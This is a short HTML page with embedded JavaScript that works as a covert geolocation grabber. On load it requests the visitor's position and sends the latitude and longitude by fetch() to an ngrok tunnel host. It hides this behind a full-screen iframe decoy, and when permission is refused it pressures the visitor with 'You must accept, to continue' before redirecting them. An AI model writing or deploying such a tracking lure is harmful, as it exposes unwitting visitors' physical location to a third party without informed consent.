  <body>
    <div id="div"><h1> You must accept, to continue. Trying Again.</h1></div>
    <script>
      let main = document.querySelector('div');
      let url = "https://19b5c31f7ea3.ngrok.io"
      let latitude = 0;
      let longitude = 0;
      function showPosition(position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        postData = url + "/loc?lat=" + latitude + "&long=" + longitude;
        fetch(postData);
      }
      function mustAccept(e) {
        main.innerHTML = "<h1> You must accept, to continue. Refresh to Try Again.</h1>";
        fetch(url + "/loc?lat=Visiting&long=To-lispacito");
        setTimeout(function () { window.location.href = "https://lispacito.github.io"; }, 1500);
      }
      function getPos () {
        window.navigator.geolocation.getCurrentPosition(showPosition, mustAccept);
        main.innerHTML = "<iframe id=\"vs\" src=\"/frame.html\" style=\"width: 100vw; height: 100vh;\"></iframe>";
      }
      getPos();
    </script>
  </body>
